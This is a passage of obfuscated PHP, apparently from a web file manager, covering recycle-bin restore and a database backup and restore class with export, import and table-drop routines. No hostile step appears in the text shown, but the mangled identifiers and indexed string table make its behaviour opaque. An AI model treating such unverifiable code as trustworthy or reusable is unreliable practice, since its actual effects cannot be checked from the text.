Model($’‚í¨“€[1310]); $Û­ƒ¥áë = $Û­ƒ¥áë == !1 ? !1 : $Û­ƒ¥áë; if (!$Èİù‡) { return !0; } $ıíÖµ¶Ú = array(); foreach ($Èİù‡ as $‚èÁÓ²) { if ($Û­ƒ¥áë != !1 && !in_array($‚èÁÓ², $Û­ƒ¥áë)) { continue; } $ïìùÂ§ = $ôœì†ğÊ->sourceInfo($‚èÁÓ²); $Š‚¦Ç‹â = $ôœì†ğÊ->sourceInfo($ïìùÂ§[$’‚í¨“€[498]]); if ($Š‚¦Ç‹â[$’‚í¨“€[431]] == $’‚í¨“€[99]) { continue; } $ôœì†ğÊ->lockMoveStart($‚èÁÓ²); $this->recycleMove($‚èÁÓ², 0); if ($ïìùÂ§[$’‚í¨“€[411]] == $’‚í¨“€[99]) { $‡ê½´À— = array($’‚í¨“€[584] => array($’‚í¨“€[544], $ïìùÂ§[$’‚í¨“€[521]] . $‚èÁÓ² . $’‚í¨“€[545])); $ôœì†ğÊ->where($‡ê½´À—)->setField($’‚í¨“€[431], 0); $this->restoreFolderChildren($‚èÁÓ², $Èİù‡); } $this->where(array($’‚í¨“€[403] => $‚èÁÓ²))->delete(); $ôœì†ğÊ->folderSizeReset($ïìùÂ§[$’‚í¨“€[498]]); $ıíÖµ¶Ú[] = $ïìùÂ§[$’‚í¨“€[498]]; if ($ïìùÂ§[$’‚í¨“€[411]] == $’‚í¨“€[99]) { $ıíÖµ¶Ú[] = $‚èÁÓ²; } $ôœì†ğÊ->lockMoveEnd($‚èÁÓ²); } $ôœì†ğÊ->updateModifyTime($ıíÖµ¶Ú); } private function restoreFolderChildren($ÆÕ©¾Åç, $‘°Õ¨’Ï) { $¿İäˆÖ­ =& $_SERVER[¹àö™Ç¾]; $ş÷ÍÔÖù = Model($¿İäˆÖ­[1310]); $›…æ„ = array($¿İäˆÖ­[403] => array($¿İäˆÖ­[17], array())); foreach ($‘°Õ¨’Ï as $»Â™…š) { if ($»Â™…š == $ÆÕ©¾Åç) { continue; } if (!$ş÷ÍÔÖù->isParentOf($ÆÕ©¾Åç, $»Â™…š)) { continue; } $îÓÕ­€ = $ş÷ÍÔÖù->sourceInfo($»Â™…š); if ($îÓÕ­€[$¿İäˆÖ­[411]] == $¿İäˆÖ­[99]) { $›…æ„[] = array($¿İäˆÖ­[584] => array($¿İäˆÖ­[544], $îÓÕ­€[$¿İäˆÖ­[521]] . $»Â™…š . $¿İäˆÖ­[545])); } else { $›…æ„[$¿İäˆÖ­[403]][1][] = $»Â™…š; } } if (!$›…æ„[$¿İäˆÖ­[403]][1]) { unset($›…æ„[$¿İäˆÖ­[403]]); } if (!$›…æ„) { return; } $›…æ„[$¿İäˆÖ­[403]][1] = array_unique($›…æ„[$¿İäˆÖ­[403]][1]); $›…æ„[$¿İäˆÖ­[985]] = $¿İäˆÖ­[1903]; $ş÷ÍÔÖù->where($›…æ„)->setField($¿İäˆÖ­[431], 1); } private function recycleMove($Ã«ª«, $™À¾½¼Ÿ = 1) { $‘¢´Àî =& $_SERVER[¹àö™Ç¾]; $¿‹–À†œ = Model($‘¢´Àî[1310]); $ğ¾Á¶× = Model($‘¢´Àî[2108]); $ıÓõ¼ö› = array($‘¢´Àî[403] => $Ã«ª«); if ($™À¾½¼Ÿ) { $¿‹–À†œ->where($ıÓõ¼ö›)->setField($‘¢´Àî[431], 1); $ğ¾Á¶×->eventRecycle($Ã«ª«, $‘¢´Àî[2109]); } else { $ğ¿£•˜û = $¿‹–À†œ->where($ıÓõ¼ö›)->find(); $ûÔø…ç = $ğ¿£•˜û[$‘¢´Àî[411]] == $‘¢´Àî[99]; $¾»‘Ç­ = $¿‹–À†œ->fileNameAuto($ğ¿£•˜û[$‘¢´Àî[498]], $ğ¿£•˜û[$‘¢´Àî[42]], REPEAT_RENAME_FOLDER, $ûÔø…ç); if ($¾»‘Ç­ != $ğ¿£•˜û[$‘¢´Àî[42]]) { $¿‹–À†œ->rename($Ã«ª«, $¾»‘Ç­); } $¿‹–À†œ->where($ıÓõ¼ö›)->setField($‘¢´Àî[431], 0); $ğ¾Á¶×->eventRecycle($Ã«ª«, $‘¢´Àî[2110]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\56\163\x6f\165\x72\143\x65\123\145\x63\162\x65\x74\114\151\x73\164"; public $field = array("\163\x6f\165\x72\x63\x65\x49\x44", "\x74\x79\x70\x65\111\x44", "\143\162\x65\x61\x74\x65\125\163\145\x72"); } goto AîŒ˜£æ…; A‹˜˜‹Í¾: class DbManage { function __construct($Îê“œ© = array()) { $±áÒÌíÂ =& $_SERVER[¹àö™Ç¾]; if (empty($Îê“œ©)) { $Îê“œ© = $GLOBALS[$±áÒÌíÂ[16]][$±áÒÌíÂ[31]]; } $this->database = $Îê“œ©; } public function model($Á ¸¾Â› = '') { return new ModelBase($Á ¸¾Â›, $_SERVER[¹àö™Ç¾][22], $this->database); } public function db($Ú¨¼â = false) { $í¡‡£·ê =& $_SERVER[¹àö™Ç¾]; $˜òñïôó = array_change_key_case($this->database); if ($this->dbType() == $í¡‡£·ê[23] || !$Ú¨¼â) { return $this->model()->db(); } $ç¯üâì… = $˜òñïôó[$í¡‡£·ê[957]]; $˜òñïôó[$í¡‡£·ê[957]] = $í¡‡£·ê[22]; if ($˜òñïôó[$í¡‡£·ê[952]] == $í¡‡£·ê[949]) { $¬íé˜¯‰ = $˜òñïôó[$í¡‡£·ê[958]]; $˜òñïôó[$í¡‡£·ê[958]] = substr($¬íé˜¯‰, 0, strrpos($¬íé˜¯‰, $í¡‡£·ê[1044])); } $this->database = $˜òñïôó; $•ªşÃ¿ = $this->model()->db(); try { $œƒ†•“ü = $•ªşÃ¿->execute("\x73\x68\157\167\x20\144\141\164\141\142\141\x73\145\x73\40\x6c\x69\153\x65\x20\47{$ç¯üâì…}\47"); } catch (Exception $¢ê¢•û¼) { } if (!$œƒ†•“ü) { $•ªşÃ¿->execute("\x63\x72\145\x61\x74\145\40\144\x61\164\x61\x62\x61\163\x65\40\140{$ç¯üâì…}\140"); } $˜òñïôó[$í¡‡£·ê[957]] = $ç¯üâì…; if ($˜òñïôó[$í¡‡£·ê[952]] == $í¡‡£·ê[949]) { $˜òñïôó[$í¡‡£·ê[958]] .= $í¡‡£·ê[1044] . $ç¯üâì…; } $this->database = $˜òñïôó; $•ªşÃ¿->execute("\x75\163\x65\40\140{$ç¯üâì…}\140"); return $•ªşÃ¿; } public function createTable($óÔïÅåé, &$Ö†ÎµË¨) { $øÈª‰¡ã =& $_SERVER[¹àö™Ç¾]; if (!IO::exist($óÔïÅåé)) { ActionCall($øÈª‰¡ã[1045], !0, 0); show_json(LNG($øÈª‰¡ã[1046]), !1); } $êÎæ»´Ø = $this->model()->db(); $ÀŞ†å‡ = sqlSplit(IO::getContent($óÔïÅåé)); foreach ($ÀŞ†å‡ as $ÄõÇ‰ü) { $ôÅğù¯ = stripos($ÄõÇ‰ü, $øÈª‰¡ã[1047]) === 0; if ($ôÅğù¯) { $Ö†ÎµË¨->task[$øÈª‰¡ã[778]] += 1; } $êÎæ»´Ø->execute($ÄõÇ‰ü); if ($ôÅğù¯) { preg_match($øÈª‰¡ã[1048], $ÄõÇ‰ü, $Ÿü›õá€); $Ö†ÎµË¨->task[$øÈª‰¡ã[1049]] = $Ÿü›õá€[1]; $Ö†ÎµË¨->update(1); } } } public function insertTable($ÛúÑÕÀÅ, &$ğîÇ¢£) { $•–Ñ¢°Â =& $_SERVER[¹àö™Ç¾]; $Ş„‹ù¾Á = $this->model()->db(); $°èƒª®´ = $Ï÷‰à‹Ö ? array($Ï÷‰à‹Ö) : $Ş„‹ù¾Á->getTables(); foreach ($ÛúÑÕÀÅ as $‚øÁï£Ş) { $Ï÷‰à‹Ö = basename($‚øÁï£Ş, $•–Ñ¢°Â[780]); if (!in_array($Ï÷‰à‹Ö, $°èƒª®´)) { continue; } $ğîÇ¢£->task[$•–Ñ¢°Â[1049]] = $Ï÷‰à‹Ö; if (get_filesize($‚øÁï£Ş) == 0) { continue; } $âúæÛÆ = $this->sqlToDb($‚øÁï£Ş, $ğîÇ¢£); if (!$âúæÛÆ) { ActionCall($•–Ñ¢°Â[1045], !0, 0); show_json(LNG($•–Ñ¢°Â[1050]) . "\x5b{$Ï÷‰à‹Ö}\135", !1); } } } public function sqlFromDb($…àíÜøÊ, $«µÍõÍê, &$Ô ‰°”í, $ûÁã­šî = '') { if ($Ô ‰°”í) { $Ô ‰°”í->task[$_SERVER[¹àö™Ç¾][1049]] = $…àíÜøÊ; } $ĞÉö«¹¦ = $this->model($…àíÜøÊ); $¯—™òäÅ = 0; $×´çşŠ = 0; $Â“ÑËÁ = 10000; $ˆôæÅŸ» = fopen($«µÍõÍê, $_SERVER[¹àö™Ç¾][1051]); $íİÓö¯± = $ĞÉö«¹¦->getPk(); $±Å¿éø = $ĞÉö«¹¦->getDbFields(); $µ»Ùóäñ = $_SERVER[¹àö™Ç¾][22]; if ($GLOBALS[$_SERVER[¹àö™Ç¾][779]] && in_array($…àíÜøÊ, array($_SERVER[¹àö™Ç¾][1052], $_SERVER[¹àö™Ç¾][1053]))) { $µ»Ùóäñ = $…àíÜøÊ; } do { $àÛıö™· = array($íİÓö¯± => array($_SERVER[¹àö™Ç¾][999], $×´çşŠ)); $‡’ôëµî = $ĞÉö«¹¦->where($àÛıö™·)->field($±Å¿éø)->order($íİÓö¯± . $_SERVER[¹àö™Ç¾][1054])->limit($Â“ÑËÁ)->select(); $‡’ôëµî = !empty($‡’ôëµî) ? $‡’ôëµî : array(); if (!($­úÂÖÍ  = count($‡’ôëµî))) { break; } $ Ãè±‹ = end($‡’ôëµî); $×´çşŠ = $ Ãè±‹[$íİÓö¯±]; $¯ˆçò• = array(); foreach ($‡’ôëµî as $’“¥ìÓø) { if ($µ»Ùóäñ) { if ($…àíÜøÊ == $_SERVER[¹àö™Ç¾][1052]) { if ($’“¥ìÓø[$_SERVER[¹àö™Ç¾][43]] == $_SERVER[¹àö™Ç¾][1055]) { $¶ó·İ¬Ÿ = json_decode($’“¥ìÓø[$_SERVER[¹àö™Ç¾][378]], !0); if ($¶ó·İ¬Ÿ[$_SERVER[¹àö™Ç¾][42]] == $GLOBALS[$_SERVER[¹àö™Ç¾][779]] && $¶ó·İ¬Ÿ[$_SERVER[¹àö™Ç¾][742]] != 1) { continue; } } } else { if ($’“¥ìÓø[$_SERVER[¹àö™Ç¾][43]] == $_SERVER[¹àö™Ç¾][1056] && $’“¥ìÓø[$_SERVER[¹àö™Ç¾][105]] == $_SERVER[¹àö™Ç¾][771]) { continue; } } } if ($ûÁã­šî) { $’“¥ìÓø[$_SERVER[¹àö™Ç¾][88]] = "\x7b\x69\x6f\x3a{$ûÁã­šî}\175" . substr($’“¥ìÓø[$_SERVER[¹àö™Ç¾][88]], strlen("\x7b\x69\157\x3a{$’“¥ìÓø[$_SERVER[¹àö™Ç¾][809]]}\175")); $’“¥ìÓø[$_SERVER[¹àö™Ç¾][809]] = $ûÁã­šî; } $¯ˆçò•[] = $_SERVER[¹àö™Ç¾][1057] . $this->sqlEncode($’“¥ìÓø) . $_SERVER[¹àö™Ç¾][1058]; } $ÎÀƒ‹á = "\111\x4e\123\x45\122\124\40\111\x4e\124\x4f\x20\x60{$…àíÜøÊ}\140\x20\50\x60" . implode($_SERVER[¹àö™Ç¾][1059], $±Å¿éø) . $_SERVER[¹àö™Ç¾][1060]; fwrite($ˆôæÅŸ», $ÎÀƒ‹á . implode($_SERVER[¹àö™Ç¾][1061], $¯ˆçò•) . $_SERVER[¹àö™Ç¾][81] . PHP_EOL); $¯—™òäÅ += $­úÂÖÍ ; if ($Ô ‰°”í) { $Ô ‰°”í->update($­úÂÖÍ ); } } while ($Â“ÑËÁ == $­úÂÖÍ ); fclose($ˆôæÅŸ»); return $¯—™òäÅ; } public function sqlToDb($üÙ¿µö¥, &$ôŸòÊë) { $´êÈûøõ =& $_SERVER[¹àö™Ç¾]; $©ÇñîŞÛ = $this->model()->db(); $ö­­»äñ = @fopen($üÙ¿µö¥, $´êÈûøõ[1062]); if (!$ö­­»äñ) { return !1; } $É½µéÒÀ = 0; $¸®ŞÀÕ‡ = $´êÈûøõ[22]; $‘Ş‘ø“… = array(); $ÀÂÈİ÷È = $this->dbType(); $çÁş‰ğ¾ = $ÀÂÈİ÷È == $´êÈûøõ[23] ? 500 : 2000; $¿”›Ùî = basename($üÙ¿µö¥, $´êÈûøõ[780]); $«³ĞÁˆş = 0; $“ç÷‹õ² = 4194304 - 104858; $º·‚ÆÀ© = 1000000 - 104858; while (!feof($ö­­»äñ)) { $ğ˜ØÃÕé = trim(fgets($ö­­»äñ)); if (!$ğ˜ØÃÕé) { continue; } $ï×Üê·› = $this->sqlDecode($ğ˜ØÃÕé, $ÀÂÈİ÷È, $¿”›Ùî); if (stripos($ï×Üê·›, $´êÈûøõ[359]) === 0) { if (!$¸®ŞÀÕ‡) { $¸®ŞÀÕ‡ = $ï×Üê·› . $´êÈûøõ[63]; } continue; } if ($ôŸòÊë) { $ôŸòÊë->task[$´êÈûøõ[778]] += 1; } $É½µéÒÀ++; $‘Ş‘ø“…[] = rtrim(rtrim(trim($ï×Üê·›), $´êÈûøõ[60]), $´êÈûøõ[81]); $ıÔ”†Ê® = null; $’©µƒñí = strlen($ï×Üê·›); $«³ĞÁˆş += $’©µƒñí; if ($«³ĞÁˆş >= ($çÁş‰ğ¾ == 500 ? $º·‚ÆÀ© : $“ç÷‹õ²)) { $ıÔ”†Ê® = array_pop($‘Ş‘ø“…); if ($É½µéÒÀ > 1) { $É½µéÒÀ--; } } if ($É½µéÒÀ >= $çÁş‰ğ¾ || $ıÔ”†Ê®) { $ï×Üê·› = $¸®ŞÀÕ‡ . implode($´êÈûøõ[60], $‘Ş‘ø“…); if (!$©ÇñîŞÛ->execute($ï×Üê·›)) { return !1; } if ($ôŸòÊë) { $ôŸòÊë->update($É½µéÒÀ); } $‘Ş‘ø“… = array(); $É½µéÒÀ = 0; $«³ĞÁˆş = 0; if ($ıÔ”†Ê®) { $‘Ş‘ø“… = array($ıÔ”†Ê®); $É½µéÒÀ = 1; $«³ĞÁˆş = $’©µƒñí; } } } fclose($ö­­»äñ); if (!empty($‘Ş‘ø“…)) { $ï×Üê·› = $¸®ŞÀÕ‡ . implode($´êÈûøõ[60], $‘Ş‘ø“…); if (!$©ÇñîŞÛ->execute($ï×Üê·›)) { return !1; } if ($ôŸòÊë) { $ôŸòÊë->update($É½µéÒÀ); } } return !0; } public function dropTable($‡±Éæ“¨ = null) { $Ş‘ÉøõÁ = $this->model()->db(); $¿Àµö‚Î = $‡±Éæ“¨ ? array($‡±Éæ“¨) : $Ş‘ÉøõÁ->getTables(); if (!$¿Àµö‚Î) { return; } foreach ($¿Àµö‚Î as $‡±Éæ“¨) { if ($‡±Éæ“¨) { $‡±Éæ“¨ = strtolower($‡±Éæ“¨); } else { continue; } $Ş‘ÉøõÁ->execute("\x64\x72\157\160\x20\164\141\x62\154\145\x20\x69\x66\40\x65\170\x69\163\x74\x73\40\x60{$‡±Éæ“¨}\140"); } } private function sqlEncode($Œïš€ÖÁ) { $Ù±‹ïÏ° =& $_SERVER[¹àö™Ç¾]; $í½¡Ñùé = array(); foreach ($Œïš€ÖÁ as $¯¢®…œ”) { if (is_array($¯¢®…œ”)) { $¯¢®…œ” = json_encode_force($¯¢®…œ”); } $¯¢®…œ” = addslashes($¯¢®…œ”); $¯¢®…œ” = str_replace(array($Ù±‹ïÏ°[1063], $Ù±‹ïÏ°[11]), array($Ù±‹ïÏ°[1064], $Ù±‹ïÏ°[1065]), $¯¢®…œ”); $í½¡Ñùé[] = str_replace($Ù±‹ïÏ°[68], $Ù±‹ïÏ°[1066], $¯¢®…œ”); } return $Ù±‹ïÏ°[68] . implode($Ù±‹ïÏ°[1067], $í½¡Ñùé) . $Ù±‹ïÏ°[68]; } private function sqlDecode($À‘å¼ÁÎ, $‡¤÷ùÛ, $ãÈ†¢­ë = '') { $â¢±Ó =& $_SERVER[¹àö™Ç¾]; $À‘å¼ÁÎ = str_replace(array($â¢±Ó[1064], $â¢±Ó[1065]), array($â¢±Ó[1063], $â¢±Ó[11]), $À‘å¼ÁÎ); if ($‡¤÷ùÛ == $â¢±Ó[23]) { return $ãÈ†¢­ë != $â¢±Ó[1068] ? stripslashes($À‘å¼ÁÎ) : $À‘å¼ÁÎ; } if ($ãÈ†¢­ë == $â¢±Ó[1068]) { $À‘å¼ÁÎ = str_replace($â¢±Ó[1069], $â¢±Ó[127], stripslashes($À‘å¼ÁÎ)); } return $À‘å¼ÁÎ; } public function getSqlFile($İÕ«Â¯¬ = '') { $ı¬»È« =& $_SERVER[¹àö™Ç¾]; $¥™€‡Ÿó = $this->dbType(!0); $İ©˜¥ÏÍ = CONTROLLER_DIR . "\151\156\x73\x74\x61\154\x6c\57\144\141\x74\141\57{$¥™€‡Ÿó}\56\x73\x71\154"; $ç¡²Çïƒ = file_get_contents($İ©˜¥ÏÍ); $¤´î›•• = $ı¬»È«[1070] . ($¥™€‡Ÿó == $ı¬»È«[796] ? $ı¬»È«[1071] : $ı¬»È«[1072]) . $ı¬»È«[1073]; preg_match_all($¤´î›••, $ç¡²Çïƒ, $´Ñ¯»Ï³); $±ºç‰„ = $´Ñ¯»Ï³[1]; $È…‚®­¥ = $this->model()->db(); $Ã¡š‘Öø = $È…‚®­¥->getTables(); $»•±ÃáÂ = TEMP_FILES . $ı¬»È«[1074] . date($ı¬»È«[743]) . $ı¬»È«[18]; del_dir($»•±ÃáÂ); mk_dir($»•±ÃáÂ); $»¤¯Õ©æ = $»•±ÃáÂ . $ı¬»È«[1075]; $ÄÌ¤Ìü = $»•±ÃáÂ . $ı¬»È«[1076]; $øŸˆÚœì = $¥™€‡Ÿó == $ı¬»È«[23] ? $ı¬»È«[796] : $ı¬»È«[23]; IO::copy(CONTROLLER_DIR . "\x69\156\x73\164\141\x6c\154\x2f\144\141\x74\x61\57{$øŸˆÚœì}\56\x73\161\x6c", $»•±ÃáÂ); @touch($»•±ÃáÂ . $¥™€‡Ÿó . $ı¬»È«[780]); $ñø„ßÌ¿ = fopen($»¤¯Õ©æ, $ı¬»È«[1051]); $ÎïìâÅÍ = fopen($ÄÌ¤Ìü, $ı¬»È«[1051]); if ($¥™€‡Ÿó == $ı¬»È«[23]) { $Ã¡š‘Öø = array_diff($Ã¡š‘Öø, array($ı¬»È«[776], $ı¬»È«[777])); $šù´´ò = array($ı¬»È«[1077], $ı¬»È«[1078], $ı¬»È«[1079]); fwrite($ÎïìâÅÍ, implode(PHP_EOL, $šù´´ò) . PHP_EOL . PHP_EOL); foreach ($Ã¡š‘Öø as $†‰Ù¸º) { $¢ÔÙş = $this->sqlFromSqlite($†‰Ù¸º); if (!$¢ÔÙş[$ı¬»È«[23]]) { continue; } fwrite($ÎïìâÅÍ, $¢ÔÙş[$ı¬»È«[23]] . PHP_EOL . PHP_EOL); if (!in_array($†‰Ù¸º, $±ºç‰„)) { fwrite($ñø„ßÌ¿, $¢ÔÙş[$ı¬»È«[796]] . PHP_EOL . PHP_EOL); } } } else { foreach ($Ã¡š‘Öø as $†‰Ù¸º) { $¢ÔÙş = $this->sqlFromMysql($†‰Ù¸º); if (!$¢ÔÙş[$ı¬»È«[796]]) { continue; } fwrite($ñø„ßÌ¿, $¢ÔÙş[$ı¬»È«[796]] . PHP_EOL . PHP_EOL); if (!in_array($†‰Ù¸º, $±ºç‰„)) { fwrite($ÎïìâÅÍ, $¢ÔÙş[$ı¬»È«[23]] . PHP_EOL . PHP_EOL); } } } fclose($ñø„ßÌ¿); fclose($ÎïìâÅÍ); $ç¡²Çïƒ = array($ı¬»È«[796] => $»¤¯Õ©æ, $ı¬»È«[23] => $ÄÌ¤Ìü); return $İÕ«Â¯¬ ? $ç¡²Çïƒ[$İÕ«Â¯¬] : $ç¡²Çïƒ; } public function dbType($•Ÿı€ñ× = false) { $±Àğß†Ü =& $_SERVER[¹àö™Ç¾]; $Êİ·éÓ› = $•Ÿı€ñ× ? $GLOBALS[$±Àğß†Ü[16]][$±Àğß†Ü[31]] : $this->database; $Êİ·éÓ› = array_change_key_case($Êİ·éÓ›); $Ä¶ÅØ‚£ = $Êİ·éÓ›[$±Àğß†Ü[952]]; if ($Ä¶ÅØ‚£ == $±Àğß†Ü[949]) { $ÑºÕÙÒŒ = explode($±Àğß†Ü[4], $Êİ·éÓ›[$±Àğß†Ü[958]]); $Ä¶ÅØ‚£ = $ÑºÕÙÒŒ[0]; } $¥³ó—£ = array($±Àğß†Ü[1080] => $±Àğß†Ü[23], $±Àğß†Ü[897] => $±Àğß†Ü[796]); if (isset($¥³ó—£[$Ä¶ÅØ‚£])) { $Ä¶ÅØ‚£ = $¥³ó—£[$Ä¶ÅØ‚£]; } return $Ä¶ÅØ‚£; } public function sqlFromMysql($Ûêë¦è, $¡ó¦Â±Ë = '') { $±ø°­àƒ =& $_SERVER[¹àö™Ç¾]; $ôôÕ£ç¡ = $this->model()->db(); $ã ºÇşì = $ôôÕ£ç¡->query($±ø°­àƒ[1081] . $Ûêë¦è . $±ø°­àƒ[389]); if (!$ã ºÇşì || !$ã ºÇşì[0]) { return !1; } $áÈµŞÒ = _get($ã ºÇşì[0], $±ø°­àƒ[1082], $±ø°­àƒ[22]); if (!$áÈµŞÒ) { return !1; } $Ğ–úó€• = "\104\x52\x4f\x50\40\124\101\x42\x4c\105\40\111\x46\40\105\x58\x49\123\x54\x53\x20\x60{$Ûêë¦è}\x60\73" . PHP_EOL . $áÈµŞÒ . $±ø°­àƒ[81]; if ($¡ó¦Â±Ë && $¡ó¦Â±Ë == $±ø°­àƒ[796]) { return $Ğ–úó€•; } $çĞ©©ñÎ = array_change_key_case($GLOBALS[$±ø°­àƒ[16]][$±ø°­àƒ[31]]); $ª…ş•¯„ = $çĞ©©ñÎ[$±ø°­àƒ[957]]; $’¾¼‰¹ê = $±ø°­àƒ[1083] . $ª…ş•¯„ . $±ø°­àƒ[1084] . $Ûêë¦è . $±ø°­àƒ[68]; $€ÁÔŒ½Ã = $±ø°­àƒ[1085] . $Ûêë¦è . $±ø°­àƒ[885]; $èû¬ìğº = $ôôÕ£ç¡->query($’¾¼‰¹ê); if (empty($èû¬ìğº)) { $º› îËÚ = array($±ø°­àƒ[796] => $±ø°­àƒ[22], $±ø°­àƒ[23] => $±ø°­àƒ[22]); return $¡ó¦Â±Ë ? $º› îËÚ[$¡ó¦Â±Ë] : $º› îËÚ; } $çà“·ô× = $ôôÕ£ç¡->query($€ÁÔŒ½Ã); $ÚşÕØºŞ = $±ø°­àƒ[22]; $úøö¡ŠÓ = array(); foreach ($çà“·ô× as $ŸËğØ) { if (!$ÚşÕØºŞ && $ŸËğØ[$±ø°­àƒ[1086]] == $±ø°­àƒ[1087]) { $ÚşÕØºŞ = $ŸËğØ[$±ø°­àƒ[1088]]; } if (isset($úøö¡ŠÓ[$ŸËğØ[$±ø°­àƒ[1086]]])) { $úøö¡ŠÓ[$ŸËğØ[$±ø°­àƒ[1086]]][$±ø°­àƒ[1089]][] = $ŸËğØ[$±ø°­àƒ[1088]]; continue; } $úøö¡ŠÓ[$ŸËğØ[$±ø°­àƒ[1086]]] = array($±ø°­àƒ[1090] => $ŸËğØ[$±ø°­àƒ[1086]], $±ø°­àƒ[1089] => array($ŸËğØ[$±ø°­àƒ[1088]]), $±ø°­àƒ[1091] => $ŸËğØ[$±ø°­àƒ[1092]] == $±ø°­àƒ[99] ? 0 : 1); } $›Ë‡ñå² = array(); foreach ($úøö¡ŠÓ as $ŸËğØ) { $ûª²•Ä¡ = $ŸËğØ[$±ø°­àƒ[1090]] == $±ø°­àƒ[1087]; $ŒªË’Àõ = array($±ø°­àƒ[1093], $ŸËğØ[$±ø°­àƒ[1091]] == $±ø°­àƒ[99] && !$ûª²•Ä¡ ? $±ø°­àƒ[1094] : $±ø°­àƒ[22], $±ø°­àƒ[1095], $±ø°­àƒ[1096] . $Ûêë¦è . $±ø°­àƒ[21] . ($ûª²•Ä¡ ? $±ø°­àƒ[1097] : $ŸËğØ[$±ø°­àƒ[1090]]) . $±ø°­àƒ[127], $±ø°­àƒ[1098], $±ø°­àƒ[127] . $Ûêë¦è . $±ø°­àƒ[127], $±ø°­àƒ[1099] . implode($±ø°­àƒ[1100], $ŸËğØ[$±ø°­àƒ[1089]]) . $±ø°­àƒ[1101]); $›Ë‡ñå²[] = implode($±ø°­àƒ[63], $ŒªË’Àõ) . $±ø°­àƒ[81]; } $ğÃ·óõŸ = array(); $éÀÛ·¾Ó = array($±ø°­àƒ[1102] => $±ø°­àƒ[1103], $±ø°­àƒ[1103] => $±ø°­àƒ[1103], $±ø°­àƒ[292] => $±ø°­àƒ[319], $±ø°­àƒ[291] => $±ø°­àƒ[319]); foreach ($èû¬ìğº as $ŸËğØ) { $ŒªË’Àõ = array($±ø°­àƒ[127] . $ŸËğØ[$±ø°­àƒ[1104]] . $±ø°­àƒ[127], isset($éÀÛ·¾Ó[$ŸËğØ[$±ø°­àƒ[1105]]]) ? $éÀÛ·¾Ó[$ŸËğØ[$±ø°­àƒ[1105]]] : $ŸËğØ[$±ø°­àƒ[1106]], $ŸËğØ[$±ø°­àƒ[1107]] == $±ø°­àƒ[883] ? $±ø°­àƒ[1108] : $±ø°­àƒ[1109], $ŸËğØ[$±ø°­àƒ[1104]] == $ÚşÕØºŞ ? $±ø°­àƒ[1110] : $±ø°­àƒ[22], $ŸËğØ[$±ø°­àƒ[934]] ? strtoupper(str_replace($±ø°­àƒ[21], $±ø°­àƒ[22], $ŸËğØ[$±ø°­àƒ[934]])) : $±ø°­àƒ[22]); $ğÃ·óõŸ[] = trim(implode($±ø°­àƒ[63], $ŒªË’Àõ)); } $ÎÁï •Œ = array($±ø°­àƒ[1111] . $Ûêë¦è . $±ø°­àƒ[1112], $±ø°­àƒ[1113] . $Ûêë¦è . $±ø°­àƒ[1114], implode($±ø°­àƒ[60] . PHP_EOL, $ğÃ·óõŸ), $±ø°­àƒ[931]); $ÛÓÑĞê™ = implode(PHP_EOL, array_merge($ÎÁï •Œ, $›Ë‡ñå²)); if ($¡ó¦Â±Ë && $¡ó¦Â±Ë == $±ø°­àƒ[23]) { return $ÛÓÑĞê™; } $º› îËÚ = array($±ø°­àƒ[796] => $Ğ–úó€•, $±ø°­àƒ[23] => $ÛÓÑĞê™); return $¡ó¦Â±Ë ? $º› îËÚ[$¡ó¦Â±Ë] : $º› îËÚ; } public function sqlFromSqlite($Ï…¬ªŸè, $¿î©ÕÜ“ = '') { $ä¬Âä¤á =& $_SERVER[¹àö™Ç¾]; $½±°¶²‰ = $this->model()->db(); $³´×²ıÅ = "\120\122\x41\x47\x4d\x41\x20\124\101\x42\114\105\x5f\111\116\x46\117\x20\50\47{$Ï…¬ªŸè}\x27\51"; $öíè˜ã® = "\123\105\114\105\x43\124\x20\x2a\40\x46\122\x4f\x4d\40\x73\161\x6c\x69\164\145\x5f\x6d\x61\163\164\145\x72\x20\x57\x48\105\122\x45\40\x74\x62\x6c\x5f\x6e\141\x6d\x65\40\x3d\x20\x27{$Ï…¬ªŸè}\47"; $äë»€ı = $½±°¶²‰->query($³´×²ıÅ); if (empty($äë»€ı)) { $ï×‘Ãó = array($ä¬Âä¤á[796] => $ä¬Âä¤á[22], $ä¬Âä¤á[23] => $ä¬Âä¤á[22]); return $¿î©ÕÜ“ ? $ï×‘Ãó[$¿î©ÕÜ“] : $ï×‘Ãó; } $ıÔå³ê = $½±°¶²‰->query($öíè˜ã®); $ü½¯’ é = $À½¬§¼ö = array(); foreach ($ıÔå³ê as $«ÅÖÈŸŞ) { if ($«ÅÖÈŸŞ[$ä¬Âä¤á[43]] == $ä¬Âä¤á[283]) { $ü½¯’ é[] = $«ÅÖÈŸŞ[$ä¬Âä¤á[1115]]; } else { $À½¬§¼ö[$«ÅÖÈŸŞ[$ä¬Âä¤á[42]]] = $«ÅÖÈŸŞ[$ä¬Âä¤á[1115]]; } } $Ã·ÇÑÅÍ = array_merge(array($ä¬Âä¤á[1111] . $Ï…¬ªŸè . $ä¬Âä¤á[127]), $ü½¯’ é, array_values($À½¬§¼ö)); $Ã·ÇÑÅÍ = implode($ä¬Âä¤á[81] . PHP_EOL, $Ã·ÇÑÅÍ) . $ä¬Âä¤á[81]; if ($¿î©ÕÜ“ && $¿î©ÕÜ“ == $ä¬Âä¤á[23]) { return $Ã·ÇÑÅÍ; } $ûÓÓÑÙØ = array(); $šıš Ü‚ = array($ä¬Âä¤á[1103] => $ä¬Âä¤á[1116], $ä¬Âä¤á[319] => $ä¬Âä¤á[1117]); $Ø»‰õ‚£ = $ä¬Âä¤á[22]; foreach ($äë»€ı as $«ÅÖÈŸŞ) { if ($«ÅÖÈŸŞ[$ä¬Âä¤á[67]] == $ä¬Âä¤á[99]) { $Ø»‰õ‚£ = $«ÅÖÈŸŞ[$ä¬Âä¤á[42]]; } $Ù“•ç¯Ï = array($ä¬Âä¤á[389] . $«ÅÖÈŸŞ[$ä¬Âä¤á[42]] . $ä¬Âä¤á[389], isset($šıš Ü‚[$«ÅÖÈŸŞ[$ä¬Âä¤á[43]]]) ? $šıš Ü‚[$«ÅÖÈŸŞ[$ä¬Âä¤á[43]]] : $«ÅÖÈŸŞ[$ä¬Âä¤á[43]], $«ÅÖÈŸŞ[$ä¬Âä¤á[45]] == $ä¬Âä¤á[99] ? $ä¬Âä¤á[1108] : $ä¬Âä¤á[1118] . $«ÅÖÈŸŞ[$ä¬Âä¤á[66]], $«ÅÖÈŸŞ[$ä¬Âä¤á[67]] == $ä¬Âä¤á[99] ? $ä¬Âä¤á[1119] : $ä¬Âä¤á[22]); 